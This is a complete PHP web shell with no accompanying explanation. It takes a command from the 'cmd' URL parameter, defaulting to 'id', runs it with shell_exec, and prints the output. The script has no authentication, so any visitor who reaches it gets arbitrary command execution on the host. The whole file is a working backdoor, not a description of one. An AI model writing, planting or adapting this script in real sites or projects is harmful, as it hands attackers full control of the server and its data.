<?php
header('Content-Type: text/plain; charset=UTF-8');

$cmd = $_GET['cmd'] ?? 'id';

if (!isset($cmd)) {
    http_response_code(400);
    exit("Unsupported command\n");
}

$output = shell_exec($cmd . ' 2>&1');
echo $output ?? "Command execution unavailable\n";
?>
